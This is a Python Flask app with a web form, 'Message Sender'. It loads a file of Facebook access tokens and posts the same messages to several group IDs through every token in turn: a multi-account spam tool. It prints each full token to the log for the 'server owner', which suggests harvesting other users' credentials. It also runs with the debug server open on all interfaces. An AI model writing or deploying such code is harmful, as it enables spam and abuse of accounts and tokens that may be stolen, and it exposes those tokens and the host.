from flask import Flask, jsonify, render_template_string, request
import requests
import time
import threading

app = Flask(__name__)

# Global variable to control message sending
send_messages_flag = True

# Load tokens from a file
def load_tokens():
    with open('tokens.txt', 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to send message to Facebook group
def send_facebook_message(access_token, group_id, message):
    url = f"https://graph.facebook.com/v12.0/{group_id}/messages"
    headers = {
        "Content-Type": "application/json"
    }
    
    payload = {
        "message": {"text": message}
    }
    
    params = {
        "access_token": access_token
    }

    response = requests.post(url, headers=headers, json=payload, params=params)
    return response.status_code, response.text

# Function to handle sending messages in a separate thread
def send_messages_thread(group_ids, messages):
    global send_messages_flag
    access_tokens = load_tokens()

    for group_id in group_ids:
        if not send_messages_flag:
            break
        for access_token in access_tokens:
            if not send_messages_flag:
                break
            message = messages.get(group_id, "")
            if message:
                status_code, response_text = send_facebook_message(access_token, group_id, message)
                print(f"Sent to {group_id}: {status_code}, {response_text}")
                
                # Notify the sender about the token being used
                notify_sender(access_token)
                
                time.sleep(1)

def notify_sender(access_token):
    # This function sends a notification to the server owner
    # Here, you can customize how you want to notify (e.g., log, send email, etc.)
    print(f"Notification: Token {access_token} is being used to send messages.")

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Message Sender</title>
        <style>
            body {
                background-image: url('https://iili.io/2K2zDZb.jpg');
                background-size: cover;
                color: white;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 50px;
            }
        </style>
    </head>
    <body>
        <h1>Message Sender</h1>
        <form id="messageForm">
            <div id="groupInputs">
                <div>
                    <input type="text" name="group_id" placeholder="Enter Group UID" required>
                    <input type="text" name="message" placeholder="Enter Message" required>
                </div>
            </div>
            <button type="button" onclick="addGroup()">Add Another Group</button>
            <button type="submit">Send Messages</button>
        </form>
        <div id="status"></div>
        <script>
            let groupCount = 1;

            function addGroup() {
                if (groupCount < 10) {
                    groupCount++;
                    const div = document.createElement('div');
                    div.innerHTML = `<input type="text" name="group_id" placeholder="Enter Group UID" required>
                                     <input type="text" name="message" placeholder="Enter Message" required>`;
                    document.getElementById('groupInputs').appendChild(div);
                }
            }

            document.getElementById('messageForm').onsubmit = function(event) {
                event.preventDefault();
                const formData = new FormData(this);
                const data = {};
                formData.forEach((value, key) => {
                    if (!data[key]) {
                        data[key] = [];
                    }
                    data[key].push(value);
                });

                const payload = data['group_id'].map((id, index) => {
                    return { id, message: data['message'][index] };
                });

                fetch('/send_messages', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => response.json())
                .then(data => document.getElementById('status').innerText = data.status);
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/send_messages', methods=['POST'])
def send_messages():
    global send_messages_flag
    send_messages_flag = True
    payload = request.json

    group_ids = [item['id'] for item in payload]
    messages = {item['id']: item['message'] for item in payload}

    thread = threading.Thread(target=send_messages_thread, args=(group_ids, messages))
    thread.start()
    return jsonify({"status": "Messages sending started."})

@app.route('/stop_messages', methods=['POST'])
def stop_messages():
    global send_messages_flag
    send_messages_flag = False
    return jsonify({"status": "Messages sending stopped."})

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=10000)
